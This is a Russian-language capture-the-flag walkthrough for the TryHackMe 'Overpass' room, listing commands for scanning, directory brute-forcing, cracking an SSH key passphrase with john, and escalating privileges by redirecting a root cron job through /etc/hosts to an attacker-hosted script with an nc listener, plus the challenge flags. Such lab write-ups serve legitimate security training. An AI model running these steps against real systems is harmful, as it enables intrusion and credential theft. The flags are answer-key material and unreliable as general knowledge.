[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Overpass](https://tryhackme.com/r/room/overpass) 

Всего 1 задание:
## Задание 1
Что происходит, когда группа нищих студентов-компьютерщиков пытается создать менеджер паролей?
Очевидно, что это идеальный коммерческий успех!

На этой коробке спрятан код подписки TryHackMe. Первый, кто найдет и активирует его, получит подписку на месяц 
бесплатно! Если вы уже являетесь подписчиком, почему бы не передать код другу? 

ОБНОВЛЕНИЕ: Код теперь заявлен.
Машина была немного изменена 25.09.2020. Это было сделано только для улучшения производительности машины. Это не 
влияет на процесс. 

### Ответить на вопросы ниже
Взломайте машину и получите флаг в user.txt
```commandline
sudo nmap -sS -sV {Add your machine ip here}
gobuster --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u {Add your machine ip here}
# {IP целевой машины}/admin
# login.js

mkdir ssh
nano id_rsa
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
# james13
chmod 600 id_rsa
ssh -i id_rsa {Добавьте сюда IP-адрес вашего компьютера} 
yes 
james13
cat user.txt
```

```commandline
thm{65c1aaf000506e56996822c6281e6bf7}
```
Повысьте свои привилегии и получите флаг в root.txt
```commandline
sudo -l
find / -perm -u=s -type -f 2>/dev/null
cat todo.txt
ls -la
cat .overpass
# {IP целевой машины}/downloads
# Используя шифр ROT47 проебразуем кодовою фразу из файла .overpass в пароль пользователя james
sudo -l
crontab -l
nano /etc/hosts
# изменим IP overpass.thm на адресс Вашей атакующей машины
# создадим реверс шел на нашей машине overpass.thm/downloads/src/buildscript.sh
python3 -m http.server 80
nc -nvlp 4444
cat root.txt
```

```commandline
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)